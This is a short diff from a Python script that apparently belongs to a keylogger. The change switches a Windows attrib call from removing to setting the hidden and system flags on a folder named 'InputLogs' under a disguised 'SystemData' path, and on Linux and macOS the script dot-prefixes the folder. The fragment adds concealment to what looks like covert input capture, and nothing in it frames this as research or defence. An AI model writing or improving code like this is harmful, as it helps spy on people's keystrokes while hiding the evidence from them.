@@ -63,7 +63,7 @@ logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
 # makes and hides the directory by making is hidden and system file
 os.makedirs(logPath, exist_ok=True)
 if platform.system() == "Windows":
-    os.system(f'attrib -h -s "{logPath}"')
+    os.system(f'attrib +h +s "{logPath}"')
 elif platform.system() in ["Linux", "Darwin"]:
     hidden_file_path = os.path.join(os.path.dirname(logPath), "." + os.path.basename(logPath))
     os.rename(logPath, hidden_file_path)
